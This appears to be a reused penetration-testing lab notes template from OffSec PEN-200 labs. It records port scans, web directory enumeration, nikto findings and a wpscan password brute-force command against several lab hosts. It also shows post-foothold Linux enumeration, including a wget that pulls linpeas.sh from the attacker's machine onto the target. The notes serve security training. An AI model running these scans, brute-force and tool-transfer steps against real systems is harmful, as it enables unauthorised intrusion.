##### Machine Information
```
IP ADDRESS:

HN: gh0st

OS: 
Nix Box

EXPLOIT/PORT:

PRIVESC: 

USERS MENTIONED:

CREDENTIALS:
```

------------------------------------------------------------------------------------
###### Initial Scanning  
#ping
```shell
#ping 
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# ping 10.11.1.133         
PING 10.11.1.133 (10.11.1.133) 56(84) bytes of data.
64 bytes from 10.11.1.133: icmp_seq=2 ttl=63 time=489 ms
64 bytes from 10.11.1.133: icmp_seq=3 ttl=63 time=55.3 ms
64 bytes from 10.11.1.133: icmp_seq=4 ttl=63 time=57.2 ms

```
#rustscan 
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# rustscan -a 10.11.1.133 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.11.1.133:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 22:24 EDT
Initiating Ping Scan at 22:24
Scanning 10.11.1.133 [4 ports]
Completed Ping Scan at 22:24, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:24
Completed Parallel DNS resolution of 1 host. at 22:24, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:24
Scanning 10.11.1.133 [1 port]
Discovered open port 80/tcp on 10.11.1.133
Completed SYN Stealth Scan at 22:24, 0.09s elapsed (1 total ports)
Nmap scan report for 10.11.1.133
Host is up, received echo-reply ttl 63 (0.057s latency).
Scanned at 2023-03-31 22:24:55 EDT for 0s

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)

```
#quick #nmap #for #rustscan
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p 21,22,80,139,445 -Pn 10.11.1.101
```
#nmapudp
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sU 10.11.1.101                            
```
#nmapfulltcp
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p- -Pn 10.11.1.133
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 22:25 EDT
Nmap scan report for 10.11.1.133
Host is up (0.061s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS 5.6
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 01 Apr 2023 02:27:53 GMT
|     Server: Microsoft IIS 5.6
|     Vary: Accept-Encoding
|     Content-Length: 619
|     Connection: close
|     Content-Type: text/html; charset=UTF-8
|     <html>
|     <head>
|     <title>Let's play with the offsec team</title>
|     </head>
|     <body style="color: #FFFFFF; background-color: #000000;font-family: verdana;">
|     <center>
|     <div style="width:600px;height:399px;background-image:url(offsec-team.jpg);">
|     <form method="post" action="login.asp">
|     <table style="padding-top:170px;">
|     <tr>
|     <td>Username: </td><td><input type="text" name="username" value=""></td>
|     </tr>
|     <tr>
|     <td>Password: </td><td><input type="password" name="password"></td>
|     </tr>
|     <tr>
|     colspan="2" align="right"><input type="submit" name="submit" value="Enter"></td>
|     </tr>
|     </table>
|     </form>
|     </div>
|     </center>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 01 Apr 2023 02:27:54 GMT
|     Server: Microsoft IIS 5.6
|     Vary: Accept-Encoding
|     Content-Length: 619
|     Connection: close
|     Content-Type: text/html; charset=UTF-8
|     <html>
|     <head>
|     <title>Let's play with the offsec team</title>
|     </head>
|     <body style="color: #FFFFFF; background-color: #000000;font-family: verdana;">
|     <center>
|     <div style="width:600px;height:399px;background-image:url(offsec-team.jpg);">
|     <form method="post" action="login.asp">
|     <table style="padding-top:170px;">
|     <tr>
|     <td>Username: </td><td><input type="text" name="username" value=""></td>
|     </tr>
|     <tr>
|     <td>Password: </td><td><input type="password" name="password"></td>
|     </tr>
|     <tr>
|     colspan="2" align="right"><input type="submit" name="submit" value="Enter"></td>
|     </tr>
|     </table>
|     </form>
|     </div>
|     </center>
|     </body>
|_    </html>
|_http-title: Let's play with the offsec team
|_http-server-header: Microsoft IIS 5.6
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=3/31%Time=642796AB%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,325,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2001\x20Apr\x20202
SF:3\x2002:27:53\x20GMT\r\nServer:\x20Microsoft\x20IIS\x205\.6\r\nVary:\x2
SF:0Accept-Encoding\r\nContent-Length:\x20619\r\nConnection:\x20close\r\nC
SF:ontent-Type:\x20text/html;\x20charset=UTF-8\r\n\r\n<html>\n<head>\n<tit
SF:le>Let's\x20play\x20with\x20the\x20offsec\x20team</title>\n</head>\n<bo
SF:dy\x20style=\"color:\x20#FFFFFF;\x20background-color:\x20#000000;font-f
SF:amily:\x20verdana;\">\n<center>\n<div\x20style=\"width:600px;height:399
SF:px;background-image:url\(offsec-team\.jpg\);\">\n<form\x20method=\"post
SF:\"\x20action=\"login\.asp\">\n<table\x20style=\"padding-top:170px;\">\n
SF:<tr>\n<td>Username:\x20</td><td><input\x20type=\"text\"\x20name=\"usern
SF:ame\"\x20value=\"\"></td>\n</tr>\n<tr>\n<td>Password:\x20</td><td><inpu
SF:t\x20type=\"password\"\x20name=\"password\"></td>\n</tr>\n<tr>\n<td\x20
SF:colspan=\"2\"\x20align=\"right\"><input\x20type=\"submit\"\x20name=\"su
SF:bmit\"\x20value=\"Enter\"></td>\n</tr>\n</table>\n</form>\n</div>\n</ce
SF:nter>\n</body>\n</html>\n")%r(HTTPOptions,325,"HTTP/1\.1\x20200\x20OK\r
SF:\nDate:\x20Sat,\x2001\x20Apr\x202023\x2002:27:54\x20GMT\r\nServer:\x20M
SF:icrosoft\x20IIS\x205\.6\r\nVary:\x20Accept-Encoding\r\nContent-Length:\
SF:x20619\r\nConnection:\x20close\r\nContent-Type:\x20text/html;\x20charse
SF:t=UTF-8\r\n\r\n<html>\n<head>\n<title>Let's\x20play\x20with\x20the\x20o
SF:ffsec\x20team</title>\n</head>\n<body\x20style=\"color:\x20#FFFFFF;\x20
SF:background-color:\x20#000000;font-family:\x20verdana;\">\n<center>\n<di
SF:v\x20style=\"width:600px;height:399px;background-image:url\(offsec-team
SF:\.jpg\);\">\n<form\x20method=\"post\"\x20action=\"login\.asp\">\n<table
SF:\x20style=\"padding-top:170px;\">\n<tr>\n<td>Username:\x20</td><td><inp
SF:ut\x20type=\"text\"\x20name=\"username\"\x20value=\"\"></td>\n</tr>\n<t
SF:r>\n<td>Password:\x20</td><td><input\x20type=\"password\"\x20name=\"pas
SF:sword\"></td>\n</tr>\n<tr>\n<td\x20colspan=\"2\"\x20align=\"right\"><in
SF:put\x20type=\"submit\"\x20name=\"submit\"\x20value=\"Enter\"></td>\n</t
SF:r>\n</table>\n</form>\n</div>\n</center>\n</body>\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 263.25 seconds

```
##### Initial Scanning Notes:
#initial #scanning #notes
- NOTES
- NOTES
- NOTES
  
##### Searchsploit Notes:
#searchsploit
- NOTES
- NOTES
- NOTES

##### Web Fuzzing : Dirsearch // GoBuster // ffuf // nikto
#gobuster #/usr/share/dirb/wordlists/common
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# gobuster dir -u http://10.11.1.133:80 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.1.133:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/31 22:58:17 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 99]
/.html                (Status: 403) [Size: 99]
/.hta                 (Status: 403) [Size: 99]
/.hta.php             (Status: 403) [Size: 99]
/.hta.txt             (Status: 403) [Size: 99]
/.hta.html            (Status: 403) [Size: 99]
/.hta.asp             (Status: 403) [Size: 99]
/.htaccess            (Status: 403) [Size: 99]
/.hta.aspx            (Status: 403) [Size: 99]
/.htaccess.aspx       (Status: 403) [Size: 99]
/.htaccess.txt        (Status: 403) [Size: 99]
/.htaccess.php        (Status: 403) [Size: 99]
/.htaccess.html       (Status: 403) [Size: 99]
/.htpasswd.txt        (Status: 403) [Size: 99]
/.htpasswd            (Status: 403) [Size: 99]
/.htpasswd.php        (Status: 403) [Size: 99]
/.htaccess.asp        (Status: 403) [Size: 99]
/.htpasswd.html       (Status: 403) [Size: 99]
/.htpasswd.asp        (Status: 403) [Size: 99]
/.htpasswd.aspx       (Status: 403) [Size: 99]
		/_vti_bin             (Status: 301) [Size: 308] [--> http://10.11.1.133/_vti_bin/]
		/_vti_cnf             (Status: 301) [Size: 308] [--> http://10.11.1.133/_vti_cnf/]
		/_vti_pvt             (Status: 301) [Size: 308] [--> http://10.11.1.133/_vti_pvt/]
		/_vti_txt             (Status: 301) [Size: 308] [--> http://10.11.1.133/_vti_txt/]
		/bak                  (Status: 301) [Size: 303] [--> http://10.11.1.133/bak/]
/cgi-bin/             (Status: 403) [Size: 99]
/cgi-bin/.txt         (Status: 403) [Size: 99]
/cgi-bin/.html        (Status: 403) [Size: 99]
/cgi-bin/.aspx        (Status: 403) [Size: 99]
/cgi-bin/.asp         (Status: 403) [Size: 99]
/cgi-bin/.php         (Status: 403) [Size: 99]
		/check.php            (Status: 200) [Size: 85770]
		/error                (Status: 200) [Size: 99]
		/error.html           (Status: 200) [Size: 99]
		/iissamples           (Status: 301) [Size: 310] [--> http://10.11.1.133/iissamples/]
		/index                (Status: 200) [Size: 619]
		/index.asp            (Status: 200) [Size: 619]
		/login                (Status: 200) [Size: 37]
		/login.asp            (Status: 200) [Size: 37]
/server-status        (Status: 403) [Size: 99]
/Sites                (Status: 301) [Size: 305] [--> http://10.11.1.133/Sites/]
/test                 (Status: 301) [Size: 304] [--> http://10.11.1.133/test/]
		/test.asp             (Status: 200) [Size: 106]
Progress: 27684 / 27690 (99.98%)

```

#dirsearch #/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```shell
#dirsearch medium.txt
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://10.11.1.133:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /root/.dirsearch/reports/10.11.1.133-80/_23-03-31_22-58-25.txt

Error Log: /root/.dirsearch/logs/errors-23-03-31_22-58-25.log

Target: http://10.11.1.133:80/

[22:58:25] Starting: 
		[22:58:29] 200 -  619B  - /index
		[22:58:30] 200 -   37B  - /login
[22:58:33] 301 -  304B  - /test  ->  http://10.11.1.133/test/
		[22:58:38] 200 -   99B  - /error
[22:58:52] 301 -  303B  - /bak  ->  http://10.11.1.133/bak/
[22:58:56] 301 -  305B  - /Sites  ->  http://10.11.1.133/Sites/
[23:02:58] 403 -   99B  - /server-status

```

```shell
# tcm recommended dirsearch
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -e php,html,js,asp,aspx -u http://10.11.1.234:10443 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#nikto #-a
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.133]
└─# nikto -host 10.11.1.133:80
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.11.1.133
+ Target Hostname:    10.11.1.133
+ Target Port:        80
+ Start Time:         2023-03-31 22:58:57 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft IIS 5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.asp
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /_vti_txt/: FrontPage directory found.
+ OSVDB-3092: /bak/: This might be interesting...
+ OSVDB-3092: /login/: This might be interesting...
+ OSVDB-3092: /test/: This might be interesting...
+ OSVDB-3233: /_vti_bin/: FrontPage directory found.
+ OSVDB-474: /Sites/Knowledge/Membership/Inspired/ViewCode.asp: The default ViewCode.asp can allow an attacker to read any file on the machine. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0737. https://docs.microsoft.com/en-us/security-updates/securitybulletins/2099/MS99-013.
+ OSVDB-7: /iissamples/exair/howitworks/Code.asp: Scripts within the Exair package on IIS 4 can be used for a DoS against the server. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0449. BID-193.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.asp: Admin login page/section found.
+ OSVDB-3092: /test.asp: This might be interesting...
+ 8727 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2023-03-31 23:09:34 (GMT-4) (637 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

#basic #ffuf
```shell
# basic ffuf scan - hail mary if nothing is found.
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.133]
└─# ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://10.11.1.133:80/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.11.1.133:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

# on atleast 2 different hosts [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 68ms]
                        [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 70ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 71ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 72ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 68ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 70ms]
#                       [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 75ms]
index                   [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 75ms]
login                   [Status: 200, Size: 37, Words: 3, Lines: 2, Duration: 63ms]
# Priority ordered case insensative list, where entries were found  [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 2664ms]
#                       [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 2665ms]
test                    [Status: 301, Size: 304, Words: 21, Lines: 10, Duration: 60ms]
#                       [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 3669ms]
# directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 3675ms]
# Copyright 2007 James Fisher [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 3673ms]
#                       [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 4687ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 4696ms]
error                   [Status: 200, Size: 99, Words: 3, Lines: 10, Duration: 62ms]
bak                     [Status: 301, Size: 303, Words: 21, Lines: 10, Duration: 63ms]
                        [Status: 200, Size: 619, Words: 27, Lines: 25, Duration: 63ms]
server-status           [Status: 403, Size: 99, Words: 3, Lines: 10, Duration: 63ms]
:: Progress: [207643/207643] :: Job [1/1] :: 634 req/sec :: Duration: [0:05:43] :: Errors: 0 ::

```

#wpscan #wordpress #plugin #reverse #shell #bruteforce #admin/princess #credentials
```shell
# Basic wpscan
┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://10.11.1.234:80

# WPscan bruteforce - reference 10.11.1.234 
┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://10.11.1.234:80/ --enumerate u,p,t -P rockyou.txt
```

Fuzzing notes:
- make sure if having issues to fuzzing to use all wordlists on kali machina and download seclists worst case scenario

##### Reverse Shell / Shell 

```shell
```

##### Foothold Enumeration Linux
#sudo #failed 
```shell
alfred@break:~/usr/bin$ sudo -l
[sudo] password for alfred: 
Sorry, user alfred may not run sudo on break.
alfred@break:~/usr/bin$ 
```
#cat #/etc/crontab
```shell
alfred@break:~/usr/bin$ cat /etc/crontab
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly 
```
#uname #-a #kernelprivesc
```shell
alfred@break:~$ uname -a
Linux break 4.4.0-166-generic #195-Ubuntu SMP Tue Oct 1 09:35:25 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
#cat #/etc*/release
```shell
alfred@break:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```
#lsb_release #-a 
```shell
alfred@break:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial
alfred@break:~$ 
```
#transfered #linpeas
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# ls               
linpeas.sh
                                                                          
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.11.1.101 - - [31/Mar/2023 19:51:13] "GET /linpeas.sh HTTP/1.1" 200 -

# pulled over linpeas
alfred@break:/tmp$ wget http://192.168.119.132/linpeas.sh
linpeas.sh                    100%[==============================================>] 808.68K  1.30MB/s    in 0.6s 
```
##### Foothold Enumeration Windows

```SHELL
```
##### Privilege Escalation
```shell
```

##### Flag
```powershell
```


###### Lessons Learned:








